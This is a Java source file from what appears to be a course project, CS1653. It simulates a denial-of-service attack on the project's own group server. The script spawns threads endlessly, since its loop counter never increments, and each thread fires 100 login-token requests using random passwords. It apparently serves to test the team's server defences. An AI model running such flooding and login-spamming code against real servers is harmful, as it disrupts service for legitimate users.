
import java.util.*;
/* cryptography libraries */
import java.security.*;
import javax.crypto.*;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

/*MaliciousUI_DOS
*	Simulates a malicious user attempting to perform a Denial of Service 
		attack against our Group Server.  
	Attack threads are constantly created (unless the malicious user 
	specifies a bound for how many attacks they want to perform against 
	the Server inside of the while loop).
*/
public class MaliciousUI_DOS
{
	public static void main(String[] args)
	{
		// Add BouncyCastle Provider
		Security.addProvider(new BouncyCastleProvider());
		Scanner kbd = new Scanner(System.in);
		
		System.out.println("Welcome to the CS1653 Group-Based File Sharing Application");
	
		String userName = "";
		byte[] password = new byte[0];
		UserToken token = null;
		
		//Obtain information for which Group Server the malicious user would like to attack
		System.out.print("\n\nPlease enter the Server Name of the Group Server you would like to attack.\n" +
				"  >> ");
		String groupServerName = kbd.next();

		System.out.print("\nPlease enter the Port Number of the Group Server you would like to attack.\n" +
				"  >> ");
		int groupPortNumber = Integer.parseInt(kbd.next());
		
		System.out.print("\nPlease enter the username to attack with: ");
		userName = kbd.next();
		
		//Spawn threads to "attack" the server forever
		//Currently it is a while(true) due to no upper bound limit on the number of threads
		int i = 0;
		while(i < 1000)
		{	
			System.out.println("ATTACK");
			password = generateHashedPassword();
			new DOS_Threat(groupServerName, groupPortNumber, userName, password).start();
		}
	
	}
	
	/*generateHashedPassword()
		Used to generate a password for the malicious client to use... Can be 
		adjusted to returned hash passwords as well
	*/
	public static byte[] generateHashedPassword()
	{
		Random rng = new Random();
		String characters = "abcdefghjkmnpqrstuvwxyzABCDEFGHJKMNPQRSTUVWXYZ23456789+@";

		int numOfChar = rng.nextInt(25) + 5;
		char[] pass = new char[numOfChar];
		for(int i = 0; i < numOfChar; i++)
		{
			pass[i] = characters.charAt(rng.nextInt(characters.length()));
		}
		
		byte[] passBytes = new String(pass).getBytes();
/*		byte[] hash = new byte[0];

		try {
		
			// Declare SHA-256 hash function
			MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
	
			// Perform hash on user password
			sha256.update(passBytes);
	
			// Get user password hash
			hash = sha256.digest();

		} catch (Exception e) {
			System.out.println("Error hashing user password.");
			System.exit(-1);
		}
	
		return hash;
*/
		return passBytes;
	}

}

/* DOS_Thread Class
	A class that acts as a thread.
	Each thread attempts to connect to the Group Server and then 
	it sends 100 "GET" requests to the server
*/
class DOS_Threat implements Runnable
{
	//Initialize GroupClient
	GroupClient g_client = new GroupClient();
	
	private Thread t;
	private Token token;
	private String server;
	private int port;
	private String userName;
	private byte[] password;
	
	//Initialize the DOS_threat
	DOS_Threat(String serverName, int portNumber, String name, byte[] pass)
	{
		server = serverName;
		port = portNumber;	
		userName = name;
		password = pass;
		System.out.println("ATTACK");
	}
	
	//Once the thread is started it will run
	//The thread connects to the Group Server and then performs 
	//100 getToken() calls against the Server
	public void run()
	{
		g_client.connect(server, port);
		int i = 0;
		while(i < 100)
		{
			g_client.getToken(userName, password);		
			++i;
		}
		
		g_client.disconnect();
	}
	
	//Used to start the thread to begin running the DOS_Threat
	public void start()
	{
		if(t == null)
		{
			t = new Thread(this);
			t.start();
		}
	}
	
	


}
